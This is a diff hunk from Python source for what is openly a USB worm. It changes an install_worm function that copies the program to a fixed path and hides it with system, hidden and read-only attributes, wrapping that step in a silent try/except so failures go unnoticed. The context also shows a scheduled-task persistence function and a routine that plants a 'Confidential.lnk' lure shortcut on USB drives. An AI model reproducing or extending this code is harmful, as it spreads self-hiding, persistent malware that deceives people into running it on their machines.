@@ -57,12 +57,14 @@ def create_scheduled_tasks(self_only = False):
             f.write("done")
 
 def install_worm():
-    if os.path.exists(WORM_PATH): os.remove(WORM_PATH)
-    exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
-    if not os.path.exists(os.path.dirname(WORM_PATH)):
-        os.makedirs(os.path.dirname(WORM_PATH))
-    shutil.copy2(exe_path, WORM_PATH)
-    subprocess.run(f"attrib +h +s +r {WORM_PATH}", shell=True)
+    try:
+        if os.path.exists(WORM_PATH): os.remove(WORM_PATH)
+        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
+        if not os.path.exists(os.path.dirname(WORM_PATH)):
+            os.makedirs(os.path.dirname(WORM_PATH))
+        shutil.copy2(exe_path, WORM_PATH)
+        subprocess.run(f"attrib +h +s +r {WORM_PATH}", shell=True)
+    except: pass
 
 def create_shortcut(drive):
     """Create a shortcut (Confidential.lnk) on USB pointing to the usb worm"""
